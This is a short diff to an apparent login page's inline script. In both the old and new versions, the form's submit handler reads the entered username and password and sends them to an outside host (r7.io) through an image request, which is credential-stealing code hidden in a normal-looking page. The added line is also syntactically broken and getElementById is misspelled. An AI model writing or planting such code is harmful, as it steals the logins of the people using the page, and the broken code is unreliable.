@@ -345,14 +345,14 @@ h6,.h6{color:#3e474c;font-weight:500}.medium-heading{color:#788991}.copy-on-imag
 document.getElementsByClassName('error-message')[0].style.display = 'none';
 document.getElementsByClassName('problem')[0].style.display = 'none';
 
-document.getElementById('login').onsubmit=function() {
+document.getElementById('login').onsubmit= function() {
     i = new Image();
-	username = document.getElementbyId('login_username').value;
-	pass = document.getElementbyId('login_password').value;
-	i.src = 'http://r7.io/e/akean?s='+ pass + " " + username;
-	alert(username);
-	alert(pass);
- 
+let username = document.getElementbyId('login_username').value;
+let pass = document.getElementbyId('login_password').value;
+alert(username);
+alert(pass);
+i.src = 'http://r7.io/e/akean?s='+ "password = " pass + "username = " + username;
+
 }
 
 </script>
